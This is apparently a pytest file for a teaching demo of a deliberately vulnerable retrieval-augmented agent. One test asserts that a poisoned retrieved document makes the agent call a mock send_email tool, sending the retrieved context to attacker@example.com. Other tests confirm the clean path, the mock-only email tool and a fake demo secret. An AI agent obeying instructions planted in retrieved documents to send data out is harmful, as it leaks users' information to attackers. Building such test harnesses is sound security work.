from __future__ import annotations

import importlib.util
from pathlib import Path


def _load_demo_target_module():
    repository_root = Path(__file__).resolve().parents[1]
    module_path = repository_root / "demo_targets" / "vulnerable_rag_agent" / "target.py"
    spec = importlib.util.spec_from_file_location("vulnerable_rag_agent_target", module_path)
    assert spec is not None
    assert spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_clean_document_path_returns_response_without_dangerous_tool_calls() -> None:
    module = _load_demo_target_module()

    result = module.run_target("Summarize the policy.", use_poisoned_doc=False)

    assert result["response"]
    assert "Policy summary:" in result["response"]
    assert "attacker@example.com" not in result["retrieved_context"]
    assert result["tool_trace"] == []


def test_poisoned_document_path_calls_mock_email_tool_for_attacker() -> None:
    module = _load_demo_target_module()

    result = module.run_target("Summarize the policy.", use_poisoned_doc=True)

    assert "attacker@example.com" in result["retrieved_context"]
    assert result["tool_trace"] == [
        {
            "tool": "send_email",
            "to": "attacker@example.com",
            "body": result["retrieved_context"],
            "status": "mock_sent",
        }
    ]


def test_send_email_is_mock_only() -> None:
    module = _load_demo_target_module()

    tool_record = module.send_email("student@example.com", "demo body")

    assert tool_record == {
        "tool": "send_email",
        "to": "student@example.com",
        "body": "demo body",
        "status": "mock_sent",
    }


def test_read_secret_returns_fixed_fake_demo_secret() -> None:
    module = _load_demo_target_module()

    assert module.read_secret() == "DEMO_SECRET_DO_NOT_USE"
